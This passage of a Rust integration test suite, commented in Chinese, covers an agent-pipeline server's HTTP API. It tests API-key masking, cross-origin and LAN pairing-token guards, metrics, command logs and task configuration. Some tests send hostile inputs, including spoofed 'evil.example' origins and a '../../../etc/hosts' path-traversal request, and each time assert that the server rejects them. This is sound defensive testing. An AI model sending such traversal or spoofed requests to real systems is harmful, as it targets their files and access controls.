    // 决策 112：掩码语义不因探针弱化——响应与原始密钥无关
    assert!(
        !body.to_string().contains("sk-super-secret-value-123456"),
        "测试连接不得回传 api_key"
    );
    mock.shutdown().await;
}

#[tokio::test]
async fn provider_test_success_reuses_stored_key_without_echoing() {
    let api = api().await;
    let mock = testkit::mock_llm::MockLlm::start(vec![testkit::mock_llm::MockRoute::sse(
        "/chat/completions",
        "data: {\"choices\":[{\"delta\":{\"content\":\"hi\"}}]}\n\ndata: [DONE]\n\n",
    )])
    .await;

    // 表单回显值 "***" + id 命中 → 后端用已存密钥发探针
    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "id": "p-default",
            "vendor": "deepseek",
            "model": "deepseek-chat",
            "base_url": mock.url,
            "api_key": "***",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["test"]["ok"], true, "{}", body);
    assert_eq!(body["test"]["message"], "连接成功");

    let requests = mock.requests().await;
    assert_eq!(requests.len(), 1);
    let auth = requests[0].header("authorization").expect("探针应带密钥");
    assert_eq!(auth, "Bearer sk-super-secret-value-123456");
    assert!(
        !body.to_string().contains("sk-super-secret-value-123456"),
        "响应不得回显密钥"
    );
    mock.shutdown().await;
}

#[tokio::test]
async fn provider_test_without_id_requires_explicit_key() {
    let api = api().await;
    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "vendor": "deepseek",
            "model": "deepseek-chat",
            "api_key": "***",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("api_key"));

    // 未知 vendor 在适配器族白名单（决策 103）处被挡，给可读结论而非 500
    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "vendor": "not-a-vendor",
            "model": "m",
            "api_key": "sk-x",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["test"]["ok"], false);
    assert!(body["test"]["message"].as_str().unwrap().contains("vendor"));
}

// ─────────────────────────── 跨源防护矩阵（决策 128）───────────────────────────

#[tokio::test]
async fn cross_origin_guard_matrix() {
    let api = api().await;
    seed(&api, "t1").await;

    // ① 带自定义头 → 过
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header("X-AgentPipeline", "1")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await;
    assert_ne!(status, StatusCode::FORBIDDEN, "带自定义头应放行");

    // ② 无 Origin/Referer（非浏览器客户端）→ 过
    let (status, _) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_ne!(status, StatusCode::FORBIDDEN);

    // ③ 本机 Origin → 过
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header(header::ORIGIN, format!("http://127.0.0.1:{PORT}"))
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await;
    assert_ne!(status, StatusCode::FORBIDDEN);

    // ④ 恶意 Origin → 403
    let (status, body) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header(header::ORIGIN, "http://evil.example")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    assert!(body["error"].as_str().unwrap().contains("跨源"));

    // ⑤ 恶意 Referer 同样被拦（form 提交没有 Origin）
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/cancel")
            .header(header::REFERER, "https://evil.example/page")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    // ⑥ GET / SSE 不受影响
    let (status, _) = call(
        &api,
        request("GET", "/tasks/t1/flow")
            .header(header::ORIGIN, "http://evil.example")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::OK,
        "SSE / GET 不受跨源防护影响（决策 128）"
    );
}

/// 票 06：对端地址层（决策 182）不得改变既有端点行为。注入 `ConnectInfo`（模拟局域网
/// 客户端）后，只读 GET 照常 200、恶意 Origin 照常 403——跨源矩阵（决策 128）逐字不变。
#[tokio::test]
async fn peer_address_layer_does_not_change_existing_endpoints() {
    let api = api().await;
    seed(&api, "t1").await;

    // ① 只读 GET 带来源地址 → 仍是 200
    let mut req = request("GET", "/tasks").body(Body::empty()).unwrap();
    req.extensions_mut()
        .insert(ConnectInfo(std::net::SocketAddr::from((
            [192, 168, 1, 50],
            40000,
        ))));
    let response = api.router.clone().oneshot(req).await.unwrap();
    assert_eq!(
        response.status(),
        StatusCode::OK,
        "对端地址层不应影响 GET /tasks"
    );

    // ② 写请求带伪造 Origin + 来源地址 → 仍被跨源防护 403
    let mut req = request("POST", "/tasks/t1/retry")
        .header(header::ORIGIN, "http://evil.example")
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from("{}"))
        .unwrap();
    req.extensions_mut()
        .insert(ConnectInfo(std::net::SocketAddr::from((
            [192, 168, 1, 50],
            40000,
        ))));
    let response = api.router.clone().oneshot(req).await.unwrap();
    assert_eq!(
        response.status(),
        StatusCode::FORBIDDEN,
        "跨源防护矩阵不变（决策 128）"
    );
}

// ─────────────────── 配对令牌（决策 182㉖㉗㉘，票 07）───────────────────
//
// 令牌只在**局域网绑定**下生效；本机（回环绑定或回环来源）零摩擦。契约测试用
// `ConnectInfo` 注入来源地址（票 06 的手法）模拟手机，用 `api_lan()` 模拟 `0.0.0.0` 绑定。

/// 局域网来源的写请求（可带配对令牌）。
fn lan_write(uri: &str, token: Option<&str>) -> Request<Body> {
    let mut builder = request("POST", uri).header(header::CONTENT_TYPE, "application/json");
    if let Some(token) = token {
        builder = builder.header("X-AgentPipeline-Token", token);
    }
    let mut req = builder.body(Body::from("{}")).unwrap();
    req.extensions_mut()
        .insert(ConnectInfo(SocketAddr::from(([192, 168, 1, 50], 40000))));
    req
}

/// 局域网来源的 GET（可带配对令牌）。
fn lan_get(uri: &str, token: Option<&str>) -> Request<Body> {
    let mut builder = request("GET", uri);
    if let Some(token) = token {
        builder = builder.header("X-AgentPipeline-Token", token);
    }
    let mut req = builder.body(Body::empty()).unwrap();
    req.extensions_mut()
        .insert(ConnectInfo(SocketAddr::from(([192, 168, 1, 50], 40000))));
    req
}

/// 回环来源的写请求（局域网形态下也存在的「本机访问」）。
fn loopback_write(uri: &str) -> Request<Body> {
    let mut req = request("POST", uri)
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from("{}"))
        .unwrap();
    req.extensions_mut()
        .insert(ConnectInfo(SocketAddr::from(([127, 0, 0, 1], 51234))));
    req
}

/// 从本机读取当前令牌（读取口仅回环可读）。
async fn loopback_token(api: &Api) -> String {
    let (status, body) = get(api, "/pairing/token").await;
    assert_eq!(status, StatusCode::OK, "本机应能读到令牌：{body}");
    body["token"].as_str().expect("应返回 token").to_string()
}

#[tokio::test]
async fn pairing_lan_loopback_peer_is_exempt() {
    // 回环豁免：局域网形态下，从本机发出的写请求不要求配对（本机零摩擦）。
    let api = api_lan().await;
    seed(&api, "t1").await;

    let response = api
        .router
        .clone()
        .oneshot(loopback_write("/tasks/t1/retry"))
        .await
        .unwrap();
    assert_ne!(
        response.status(),
        StatusCode::FORBIDDEN,
        "回环来源免配对（票 07）"
    );
}

#[tokio::test]
async fn pairing_lan_peer_without_token_is_rejected() {
    let api = api_lan().await;
    seed(&api, "t1").await;

    // 写请求：无令牌 → 403
    let response = api
        .router
        .clone()
        .oneshot(lan_write("/tasks/t1/retry", None))
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("配对"),
        "报文应告诉用户去配对：{body}"
    );

    // 工头端点是 GET 也要令牌（决策 182㉘：「花钱要凭据」不看请求方法）
    let response = api
        .router
        .clone()
        .oneshot(lan_get("/foreman/session", None))
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "局域网读工头会话也需令牌：{body}"
    );

    // 提议的三个端点落在 `/foreman/` 前缀下，**自动继承配对护**（决策 182⑦）——
    // 执行提议是写动作里最重的一种（它会碰文件或改流水线状态），更要凭据。
    for uri in ["/foreman/proposals", "/foreman/commands"] {
        let response = api
            .router
            .clone()
            .oneshot(lan_get(uri, None))
            .await
            .unwrap();
        assert_eq!(
            response.status(),
            StatusCode::FORBIDDEN,
            "局域网读提议/命令也需令牌：{uri}"
        );
    }
    for uri in [
        "/foreman/proposals/whatever/execute",
        "/foreman/proposals/whatever/reject",
    ] {
        let response = api
            .router
            .clone()
            .oneshot(lan_write(uri, None))
            .await
            .unwrap();
        assert_eq!(
            response.status(),
            StatusCode::FORBIDDEN,
            "局域网执行提议也需令牌：{uri}"
        );
    }
}

#[tokio::test]
async fn pairing_lan_peer_with_token_passes() {
    let api = api_lan().await;
    seed(&api, "t1").await;
    let token = loopback_token(&api).await;

    let response = api
        .router
        .clone()
        .oneshot(lan_write("/tasks/t1/retry", Some(&token)))
        .await
        .unwrap();
    assert_ne!(
        response.status(),
        StatusCode::FORBIDDEN,
        "带正确令牌的写请求应放行"
    );

    // 工头端点：未接线时是 503，但绝不能是 403——配对层已放行
    let response = api
        .router
        .clone()
        .oneshot(lan_get("/foreman/session", Some(&token)))
        .await
        .unwrap();
    assert_ne!(
        response.status(),
        StatusCode::FORBIDDEN,
        "带令牌的工头 GET 不该被配对层拦"
    );
}

#[tokio::test]
async fn pairing_lan_read_only_get_is_not_guarded() {
    let api = api_lan().await;
    seed(&api, "t1").await;

    let response = api
        .router
        .clone()
        .oneshot(lan_get("/tasks", None))
        .await
        .unwrap();
    assert_eq!(
        response.status(),
        StatusCode::OK,
        "只读页照旧可直接分享（看的随便看）"
    );

    let response = api
        .router
        .clone()
        .oneshot(lan_get("/server-info", None))
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
}

#[tokio::test]
async fn pairing_token_endpoint_is_readable_only_over_loopback() {
    let api = api_lan().await;

    let response = api
        .router
        .clone()
        .oneshot(lan_get("/pairing/token", None))
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "局域网客户端读不到令牌：{body}"
    );

    assert!(!loopback_token(&api).await.is_empty(), "回环可读到非空令牌");
}

#[tokio::test]
async fn pairing_reset_rotates_and_old_token_stops_working() {
    let api = api_lan().await;
    seed(&api, "t1").await;
    let old = loopback_token(&api).await;

    // 回环豁免使「丢了令牌」也能从本机一键重置
    let response = api
        .router
        .clone()
        .oneshot(loopback_write("/pairing/reset"))
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let new = body["token"]
        .as_str()
        .expect("重置应返回新令牌")
        .to_string();
    assert_ne!(old, new, "重置必须换令牌");

    let response = api
        .router
        .clone()
        .oneshot(lan_write("/tasks/t1/retry", Some(&old)))
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::FORBIDDEN, "旧令牌立即失效");

    let response = api
        .router
        .clone()
        .oneshot(lan_write("/tasks/t1/retry", Some(&new)))
        .await
        .unwrap();
    assert_ne!(response.status(), StatusCode::FORBIDDEN, "新令牌可用");

    assert_eq!(loopback_token(&api).await, new, "读取端点回显同一枚令牌");
}

#[tokio::test]
async fn pairing_default_loopback_bind_requires_no_token() {
    // 默认回环形态 = 本机零摩擦（票 07 的验收项），也证明既有行为矩阵未被改动。
    let api = api().await;
    seed(&api, "t1").await;

    let (status, _) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_ne!(status, StatusCode::FORBIDDEN, "回环绑定不要求配对");

    // 令牌只在**绑定形态**下生效：即使来源地址是局域网，回环绑定也不启用它。
    let response = api
        .router
        .clone()
        .oneshot(lan_write("/tasks/t1/retry", None))
        .await
        .unwrap();
    assert_ne!(
        response.status(),
        StatusCode::FORBIDDEN,
        "非 LAN 绑定下令牌不生效"
    );
}

/// 决策 157：配置 / CLI 扩权的 origin 放行，且只放行**精确匹配**的那一个——
/// 未配置的局域网 origin 与前缀伪装仍被拦。
async fn post_retry_with_origin(api: &Api, origin: &str) -> (StatusCode, Value) {
    call(
        api,
        request("POST", "/tasks/t1/retry")
            .header(header::ORIGIN, origin)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await
}

#[tokio::test]
async fn cross_origin_allows_configured_extra_origin_only() {
    let api = api_with_origins(
        Settings {
            pending_resume_cooldown_sec: 5,
            ..Default::default()
        },
        vec!["http://192.168.1.50:8787".into()],
    )
    .await;
    seed(&api, "t1").await;

    // ① 配置过的局域网 origin → 过
    let (status, _) = post_retry_with_origin(&api, "http://192.168.1.50:8787").await;
    assert_ne!(status, StatusCode::FORBIDDEN, "扩权 origin 应放行");

    // ② 缺省本机 origin 仍放行
    let (status, _) = post_retry_with_origin(&api, "http://localhost:8787").await;
    assert_ne!(status, StatusCode::FORBIDDEN);

    // ③ 未配置的局域网 origin → 403
    let (status, body) = post_retry_with_origin(&api, "http://192.168.1.51:8787").await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");

    // ④ 扩权 origin 的前缀伪装仍拦
    let (status, body) = post_retry_with_origin(&api, "http://192.168.1.50:8787.evil.com").await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
}

// ─────────────────────────── SSE 通道（决策 76 / 84 / 123）───────────────────────────

#[tokio::test]
async fn stream_is_the_only_event_channel_and_carries_branch() {
    let api = api().await;
    seed(&api, "t1").await;

    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", "/tasks/t1/stream")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_string();
    assert!(
        content_type.starts_with("text/event-stream"),
        "{content_type}"
    );

    // 事件体格式：type + branch（用录制器直接验证序列化契约）
    let recorder = testkit::SseRecorder::new();
    use agentpipeline_core::sse::SseSink;
    recorder.emit(SseEvent::NodeStarted {
        task_id: "t1".into(),
        branch: "develop-design".into(),
        stage: Stage::DevelopDesign,
        node: agentpipeline_core::types::Node::Execute,
        attempt: 1,
        run_id: 1,
    });
    assert_eq!(recorder.count_of(SseEventType::NodeStarted), 1);
    assert_eq!(recorder.branches(), vec!["develop-design".to_string()]);
}

// ─────────────────────────── 只读视图（决策 63 / 99 / 114 / 76）───────────────────────────

#[tokio::test]
async fn flow_metrics_and_conversations_endpoints() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();

    // system run 有 run 行但无会话行（决策 99 / 114）
    let store = &api.state.store;
    let system_run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::Init,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "system".into(),
            parent_run_id: None,
            prompt_template_hash: None,
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .finish_run(
            system_run,
            &agentpipeline_core::storage::observability::RunOutcome {
                status: Some(agentpipeline_core::types::NodeStatus::Success),
                duration_ms: 42,
                ..Default::default()
            },
        )
        .await
        .unwrap();

    let llm_run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::ArchitectDesign,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "main".into(),
            parent_run_id: None,
            prompt_template_hash: Some("abcdef0123456789".into()),
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .finish_run(
            llm_run,
            &agentpipeline_core::storage::observability::RunOutcome {
                status: Some(agentpipeline_core::types::NodeStatus::Success),
                prompt_tokens: 100,
                completion_tokens: 50,
                duration_ms: 7,
                ..Default::default()
            },
        )
        .await
        .unwrap();
    store
        .insert_conversation(
            "t1",
            llm_run,
            Stage::ArchitectDesign,
            agentpipeline_core::types::Node::Execute,
            1,
            "main",
            None,
            &serde_json::json!([{"role": "system", "content": "x"}]),
            None,
            Some(&serde_json::json!({"readiness": true})),
            100,
            50,
        )
        .await
        .unwrap();
    store.refresh_task_totals("t1").await.unwrap();

    // metrics：system run 不计入 total_calls（决策 130 ②）
    let (status, body) = get(&api, "/tasks/t1/metrics").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["total_calls"], 1);
    assert_eq!(body["total_tokens"], 150);
    assert_eq!(body["stored_total_calls"], 1);

    // conversations：只列 LLM run
    let (_, body) = get(&api, "/tasks/t1/conversations").await;
    let conversations = body["conversations"].as_array().unwrap();
    assert_eq!(conversations.len(), 1);
    assert_eq!(conversations[0]["agent_type"], "main");

    // 单条会话
    let (status, body) = get(&api, &format!("/tasks/t1/conversations/{llm_run}")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["conversation"]["prompt_tokens"], 100);

    // flow：流转时间线 + 游标
    let (status, body) = get(&api, "/tasks/t1/flow").await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["cursors"].as_array().unwrap().len() == 1);

    // 两条 validate_output run：attempt 1 通过 + attempt 2 通过 → 首过率 0.5
    for attempt in [1u32, 2u32] {
        let id = store
            .insert_run(&agentpipeline_core::storage::observability::NewRun {
                task_id: "t1".into(),
                cursor_id: cursor.cursor_id.clone(),
                stage: Stage::ArchitectDesign,
                node: agentpipeline_core::types::Node::ValidateOutput,
                attempt,
                agent_type: "main".into(),
                parent_run_id: None,
                prompt_template_hash: None,
                process_group_id: None,
            })
            .await
            .unwrap();
        store
            .finish_run(
                id,
                &agentpipeline_core::storage::observability::RunOutcome {
                    status: Some(agentpipeline_core::types::NodeStatus::Success),
                    duration_ms: 3,
                    ..Default::default()
                },
            )
            .await
            .unwrap();
    }

    // 全局指标
    let (status, body) = get(&api, "/metrics").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["tasks"], 1);
    // 全局 token / 调用数 / 首过率复用 metrics 纯函数口径（决策 130② / 137），
    // 与任务级指标同源：3 条 LLM run（1 伪 + 2 validate）、system run 不计。
    assert_eq!(body["total_tokens"], 150, "{body}");
    assert_eq!(body["total_calls"], 3, "{body}");
    assert_eq!(body["validate_first_pass_rate"], 0.5, "{body}");
}

#[tokio::test]
async fn command_log_endpoints_expose_卸载_output() {
    let api = api().await;
    seed(&api, "t1").await;
    let store = &api.state.store;

    use agentpipeline_core::agent::tools::{CommandFinish, CommandRecorder, CommandStart};
    let command_id = store
        .record_start(CommandStart {
            task_id: Some("t1".into()),
            session_id: None,
            run_id: None,
            stage: Stage::Test,
            node: agentpipeline_core::types::Node::Execute,
            source: agentpipeline_core::types::CommandSource::System,
            command: "cargo test".into(),
            cwd: "/tmp".into(),
        })
        .await
        .unwrap();
    // 卸载文件真实落盘
    let offload = api._home.home().context_dir("t1").join("out.txt");
    std::fs::create_dir_all(offload.parent().unwrap()).unwrap();
    std::fs::write(&offload, "完整输出\n第二行").unwrap();
    store
        .record_finish(
            command_id,
            CommandFinish {
                exit_code: Some(0),
                stdout_path: Some(offload.display().to_string()),
                duration_ms: 12,
                ..Default::default()
            },
        )
        .await
        .unwrap();

    let (status, body) = get(&api, "/tasks/t1/commands").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["commands"].as_array().unwrap().len(), 1);
    assert_eq!(body["commands"][0]["command"], "cargo test");

    let (status, body) = get(&api, &format!("/tasks/t1/commands/{command_id}")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["command"]["source"], "system");

    // 完整 stdout 从卸载文件读取（决策 114）
    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", &format!("/tasks/t1/commands/{command_id}/output"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), 1024 * 1024)
        .await
        .unwrap();
    assert_eq!(String::from_utf8_lossy(&bytes), "完整输出\n第二行");
}

// ─────────────────────────── 任务产出文件（G12 / §4.2）───────────────────────────

#[tokio::test]
async fn task_files_endpoint_reads_inside_task_dir_only() {
    let api = api().await;
    seed(&api, "t1").await;
    let design = api._home.home().task_file("t1", "design.md");
    std::fs::create_dir_all(design.parent().unwrap()).unwrap();
    std::fs::write(&design, "# 设计文档").unwrap();

    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", "/tasks/t1/files/design.md")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), 1024 * 1024)
        .await
        .unwrap();
    assert_eq!(String::from_utf8_lossy(&bytes), "# 设计文档");

    // 目录逃逸必须被拒（G11 的 API 侧防线）
    let (status, _) = get(&api, "/tasks/t1/files/../../../etc/hosts").await;
    assert!(
        status == StatusCode::FORBIDDEN || status == StatusCode::NOT_FOUND,
        "越界路径应被拒绝，实际 {status}"
    );
}

// ─────────────── 偏离修复回归（2026-09-12 文档-实现对齐）───────────────

#[tokio::test]
async fn cross_origin_rejects_prefix_spoofing_but_accepts_same_origin_referer_path() {
    // 决策 128（修订）：严格相等，禁前缀匹配
    let api = api().await;
    seed(&api, "t1").await;

    for spoofed in [
        format!("http://127.0.0.1:{PORT}0.evil.example"),
        format!("http://127.0.0.1:{PORT}.evil.example"),
        "http://localhost:9999".to_string(),
    ] {
        let (status, _) = call(
            &api,
            request("POST", "/tasks/t1/retry")
                .header(header::ORIGIN, spoofed.clone())
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from("{}"))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{spoofed}");
    }

    // 同源 Referer（带路径）放行
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header(header::REFERER, format!("http://127.0.0.1:{PORT}/tasks/t1"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_ne!(status, StatusCode::FORBIDDEN, "同源 Referer 应放行");
}

#[tokio::test]
async fn human_review_comments_reach_the_transition_reason() {
    // §12.5：`POST /tasks/{id}/review {approved, comments}`，打回时评论带给 develop
    let api = api().await;
    let project_id = seed(&api, "t1").await;
    seed_task_full(
        &api.state.store,
        "t-human",
        &project_id,
        ReviewMode::Human,
        &[],
    )
    .await
    .unwrap();

    let (status, body) = post(
        &api,
        "/tasks/t-human/review",
        serde_json::json!({"approved": false, "comments": "错误处理缺失，请补齐"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let transitions = api.state.store.list_transitions("t-human").await.unwrap();
    assert!(transitions.iter().any(|t| t
        .reason
        .as_deref()
        .is_some_and(|r| r.contains("错误处理缺失，请补齐"))));
}

#[tokio::test]
async fn goto_rejects_targets_outside_the_stage_entry_node() {
    // 决策 69：goto 落点 = entry_node(stage)
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::UserDecision,
                Stage::Develop,
                agentpipeline_core::types::Node::Execute,
                "重复风险",
            )
            .with_context(agentpipeline_core::types::PendingContext::with_kind(
                "duplicate_risk",
            )),
        )
        .await
        .unwrap();

    // 非入口节点 → 400
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "goto", "target_stage": "develop", "target_node": "validate_input"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("入口节点"));

    // entry_node(stage) → 放行
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "goto", "target_stage": "develop", "target_node": "execute"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

#[tokio::test]
async fn dependency_failed_continue_requeues_without_spawning() {
    // 决策 130⑤：continue 交还准入，不直接 spawn executor
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::DependencyFailed,
                Stage::Develop,
                agentpipeline_core::types::Node::Execute,
                "依赖任务 dep 已取消",
            )
            .with_context(agentpipeline_core::types::PendingContext::with_kind(
                "dependency_cancelled",
            )),
        )
        .await
        .unwrap();

    let before = api.resumes.load(Ordering::SeqCst);
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "continue"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["spawned"], false, "dependency continue不得 spawn");
    assert_eq!(api.resumes.load(Ordering::SeqCst), before);
    assert_eq!(
        api.state.store.get_task("t1").await.unwrap().status,
        TaskStatus::Queued,
        "置回 queued 交还准入（决策 116）"
    );
}

#[tokio::test]
async fn commands_are_scoped_to_their_task() {
    let api = api().await;
    seed(&api, "t1").await;
    seed(&api, "t2").await;

    let cmd_id = api
        .state
        .store
        .record_start(agentpipeline_core::agent::tools::CommandStart {
            task_id: Some("t1".into()),
            session_id: None,
            run_id: None,
            stage: Stage::Develop,
            node: agentpipeline_core::types::Node::Execute,
            source: agentpipeline_core::types::CommandSource::System,
            command: "cargo test".into(),
            cwd: ".".into(),
        })
        .await
        .unwrap();

    let (status, _) = get(&api, &format!("/tasks/t2/commands/{cmd_id}")).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "不得跨任务读命令");
    let (status, _) = get(&api, &format!("/tasks/t2/commands/{cmd_id}/output")).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, _) = get(&api, &format!("/tasks/t1/commands/{cmd_id}")).await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn retry_resets_worktree_and_records_the_system_command() {
    // 决策 125：retry 显式 `git reset --hard {base_ref}` + `git clean -fdx`（记 system 命令）
    let api = api().await;
    seed(&api, "t1").await;

    let worktree = api._home.home().worktree_path("t1");
    agentpipeline_core::git::Git
        .init_worktree(api._repo.path(), "t1", &worktree, "main")
        .await
        .unwrap();
    std::fs::write(worktree.join("half_done.txt"), "半成品").unwrap();
    api.state
        .store
        .set_task_worktree("t1", worktree.to_string_lossy().as_ref(), "kanban/t1")
        .await
        .unwrap();
    api.state
        .store
        .mark_terminal("t1", TaskStatus::Failed)
        .await
        .unwrap();

    let (status, body) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    assert!(
        !worktree.join("half_done.txt").exists(),
        "clean -fdx 应清掉半成品"
    );
    let cmds = api
        .state
        .store
        .list_commands("t1", None, None)
        .await
        .unwrap();
    assert_eq!(cmds.len(), 1, "{:?}", cmds);
    assert_eq!(
        cmds[0].source,
        agentpipeline_core::types::CommandSource::System
    );
    assert!(cmds[0].command.contains("reset --hard"));
    assert_eq!(cmds[0].exit_code, Some(0));
    assert_eq!(
        api.state.store.get_task("t1").await.unwrap().status,
        TaskStatus::Queued,
        "置回 queued 重新走准入（决策 117）"
    );
}

// ─────────────────── 阶段级 agent 配置（决策 22 / 46 / 66 / 111 / 129）───────────────────

#[tokio::test]
async fn stage_config_round_trips_and_resets_to_default() {
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({
            "provider_id": "p-default",
            "temperature": 0.2,
            "max_tokens": 4096,
            "idle_timeout_sec": 120
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["stage"], "develop");
    assert_eq!(body["stage_config"]["provider_id"], "p-default");
    assert_eq!(body["stage_config"]["max_tokens"], 4096);

    let (status, body) = get(&api, "/stage-configs").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let list = body["stage_configs"].as_array().unwrap();
    assert_eq!(list.len(), 1, "{body}");
    assert_eq!(list[0]["stage"], "develop");

    // 整条替换：缺省字段清空
    let (status, _) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"max_tokens": 2048}),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let cfg = api
        .state
        .store
        .get_stage_config("develop")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(cfg.provider_id, None, "PUT 是整条替换，未给字段回默认");
    assert_eq!(cfg.max_tokens, Some(2048));

    let (status, _) = delete(&api, "/stage-configs/develop").await;
    assert_eq!(status, StatusCode::OK);
    assert!(api
        .state
        .store
        .get_stage_config("develop")
        .await
        .unwrap()
        .is_none());

    let (status, _) = delete(&api, "/stage-configs/develop").await;
    assert_eq!(status, StatusCode::NOT_FOUND, "重复删除应 404");
}

#[tokio::test]
async fn stage_config_accepts_node_scoped_skills_and_rejects_unknown() {
    // 决策 170：节点级技能经 `node_overrides_json[node].skills` 声明，
    // 准入语义与启动校验同源（未知技能名 → 400）。
    //
    // 票 03：技能正文来自**用户目录技能**（不再依赖内嵌常量），
    // 故先在 API 自己的临时 home 技能根下放两个技能。
    let api = api().await;
    let skills_root = api.state.home.root().join("skills");
    for name in ["grilling", "to-spec"] {
        let dir = skills_root.join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("SKILL.md"),
            format!("---\nname: {name}\ndescription: 测试技能\n---\n\n{name} 的正文"),
        )
        .unwrap();
    }

    // 知识型技能（用户目录有正文）→ 可写入并原样回读
    let payload = serde_json::json!({
        "node_overrides_json": {
            "validate_input": {"skills": ["grilling"]},
            "execute": {"skills": ["to-spec"]}
        }
    });
